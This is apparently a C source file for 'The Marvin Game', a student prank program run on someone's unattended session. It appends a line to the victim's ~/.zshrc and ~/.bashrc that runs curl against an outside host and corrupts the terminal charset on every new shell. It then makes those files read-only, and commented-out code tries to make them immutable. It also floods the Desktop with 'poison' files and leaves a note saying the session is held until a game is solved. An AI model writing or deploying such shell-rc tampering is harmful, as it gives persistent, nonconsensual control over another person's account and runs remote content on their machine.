/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   marvin_game.c                                      :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/06/22 01:20:52 by mgama             #+#    #+#             */
/*   Updated: 2023/07/05 17:35:46 by mgama            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/marvin_game.h"

int	print_consignes(t_data *data, char **envp)
{
	int		fd;
	char	*path;
	char	*t_cmd;
	char	**cmd;

	path = ft_strjoin(data->active_dir, "/consignes.mxga.txt");
	if (!path)
		return (1);
	if ((fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0777)) < 0)
		return (free(path), 1);
	dprintf(fd, "--------------------Start Marvin Game--------------------\n\n");
	if (data->lang == FR)
	{
		dprintf(fd, "Bienvenue dans The Marvin Game ;)\n\n");
		dprintf(fd, "Ta session était sans surveillance, quel dommage !\n\n");
		dprintf(fd, "Pour pouvoir l'utiliser à nouveau tu vas devoir jouer à notre petit jeu. Une version de 'Où est Charlie', version 42.\n");
		dprintf(fd, "Comme tu as pu le constater il y a quelques nouveaux fichiers sur ton bureau, seul l'un d'eux est capable de t'aider.\n");
		dprintf(fd, "Essaie de cliquer sur l'un d'eux tu verra.🤭\n\n");
		dprintf(fd, "Il ne te reste plus qu'à chercher. Amuse-toi bien ! 🫶\n\n");
	}
	else
	{
		dprintf(fd, "Welcome to The Marvin Game ;)\n\n");
		dprintf(fd, "Your session was alone, what a shame!\n\n");
		dprintf(fd, "To be able to use it again you will have to play our little game. A version of 'Where's Wally', version 42.\n");
		dprintf(fd, "As you can see there are some new files on your desktop, only one of them is able to help you.\n");
		dprintf(fd, "Try to click on one of them you'll see.🤭\n\n");
		dprintf(fd, "All you have to do is search. Have fun! 🫶\n\n");
	}
	dprintf(fd, "---------------------------------------------------------\n\n");	
	close(fd);
	printf("\033[36mCreating consignes.mxga.txt...\033[0m\n");
#if __APPLE__
	t_cmd = ft_strjoin("open ", path);
#else
	t_cmd = ft_strjoin("xdg-open ", path);
#endif /* __APPLE__ */
	printf("created at %s\n", path);
	if (!t_cmd)
		return (free(path), 1);
	cmd = ft_split(t_cmd, ' ');
	free(t_cmd);
	if (!cmd)
		return (free(path), 1);
	process_child(cmd, envp);
	waitpid(-1, NULL, 0);
	if (data->has_logs)
		dprintf(data->log_fd, "%s\n", path);
	free(path);
	free_tab(cmd);
	return (0);
}

int	copy_alias(char **envp)
{
	int			i;
	int			fd;
	// int			flags;
	char		*path;
	static char	*command = "curl rand-1.maxencegama.dev -L";
	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};

	(void)(envp);
	// flags = 0;
	printf("\033[36mStart shell rc modifications...\033[0m\n");
	i = -1;
	while (file_list[++i])
	{
		path = ft_strjoin(getenv("HOME"), file_list[i]);
		if (!path)
			return (1);
		chmod(path, 0644);
		printf("opening and writing in %s\n", path);
		if ((fd = open(path, O_CREAT | O_WRONLY | O_APPEND)) < 0)
			return (dprintf(2, "Could not open %s\n", path), free(path), 1);
		dprintf(fd, "GMVRA=\"%lu\"; echo '\e(0'; %s\n", ft_abs_time(), command);
		// #if __APPLE__
		// if (chflags(path, UF_IMMUTABLE) < 0)
		// 	// return (dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
		// 	if (setxattr(path, "security.evm", "immutable", sizeof("immutable"), 0, 0) < 0)
		// 		return (perror("error"), fflush(NULL), dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
		// #else
		// // flags |= EXT2_IMMUTABLE_FL;
		// // if (ioctl(fd, FS_IOC_SETFLAGS, &flags) < 0)
		// // 	return (dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
		// 	if (setxattr(path, "security.evm", "immutable", sizeof("immutable"), 0) < 0)
		// 		return (perror("error"), fflush(NULL), dprintf(2, "Could not execute ioctl on file %s\n", path), 1);
		// #endif /* __APPLE__ */
		chmod(path, 0444);
		free(path);
		close(fd);
	}
	printf("--------------------\n");
	return (0);
}

int	copy_poison(t_data *data, char **envp)
{
	int		i;
	char	***cp_command;

	i = -1;
	printf("\033[36mStart poison and healer copy...\033[0m\n");
	cp_command = gen_poison_cmd(data);
	if (!cp_command)
		return (1);
	while (++i < data->file_count)
	{
		if (data->has_logs)
			dprintf(data->log_fd, "%s\n", cp_command[i][2]);
		process_child(cp_command[i], envp);
	}
	printf("%d files generated\n", i);
	waitpid(-1, NULL, 0);
	free_double_tab(cp_command);
	printf("--------------------\n");
	return (0);
}

int	setup_game(t_data *data, char **envp)
{
	char	b[SPRINTF_MAX];

	if (data->has_logs)
	{
		snprintf(b, SPRINTF_MAX, "%s/.traces_%s_%lu.mg", data->current_dir, getenv("USER"), ft_abs_time());
		if ((data->log_fd = open(b, O_CREAT | O_WRONLY | O_TRUNC, 0644)) < 0)
			return (dprintf(2, "Could not open traces file %s\n", b), 1);
	}
#ifndef __APPLE__ /* remove this statement before executing on MacOS */
	if (copy_alias(envp))
		return (dprintf(2, "Something went wrong, exit program :(\n"), 1);
#else
	printf("Avoiding my local shell rc corruption :)\n");
	printf("--------------------\n");
#endif /* __APPLE__ */
	if (copy_poison(data, envp))
		return (dprintf(2, "Something went wrong, exit program :(\n"), 1);
	print_consignes(data, envp);
	if (data->log_fd)
		close(data->log_fd);
	return (0);
}

int	main(int argc, char **argv, char **envp)
{
	t_data	data;
	int		t;
	DIR		*desktop_dir;
	struct utsname	uts;
#ifndef __APPLE__
	char	home_buffer[PATH_MAX];
#endif /* __APPLE__ */

	srand(time(NULL));
	bzero(&data, sizeof(t_data));
	desktop_dir = NULL;
	if (!getcwd(data.current_dir, sizeof(data.current_dir)))
		return (dprintf(2, "Cannot get current dir\n"), 1);
	printf("--------------------Start Marvin Game--------------------\n");
	data.lang_list = ft_split("fr en", ' ');
	if (!data.lang_list)
		return (1);
	if (parse_args(argc, argv, &data))
		return (free_tab(data.lang_list), 1);
	if (!data.has_logs)
		printf("❗️No-log mode enabled\n");
	if (!data.active_dir)
	{
#if __APPLE__
		data.active_dir = strdup("./tmp");
#else
		data.active_dir = ft_strjoin(realpath(getenv("HOME"), home_buffer), "/Desktop");
#endif /* __APPLE__ */
		printf("❗️No active dir given, using default %s\n", data.active_dir);
	}
	if (!data.active_dir || !(desktop_dir = opendir(data.active_dir)))
		return (data.active_dir && (free(data.active_dir), 1), free_tab(data.lang_list), dprintf(2, "Cannot access active dir\n"), 1);
	free(desktop_dir);
	if (uname(&uts))
		return (free(data.active_dir), free_tab(data.lang_list), dprintf(2, "Could not get uname\n"), 1);
	printf("\nRecap:\nPlatform = %s\nOutput lang = %s\nFile count = %d\nActive dir = %s\nCurrent dir = %s\n--------------------\n", uts.sysname, data.lang_list[data.lang], data.file_count, data.active_dir, data.current_dir);
	printf("(Press ENTER to continue...)");
	getchar();
	printf("\033[A\033[K");
	t = setup_game(&data, envp);
	free(data.active_dir);
	free_tab(data.lang_list);
	printf("---------------------------------------------------------\n");
	return (t);
}
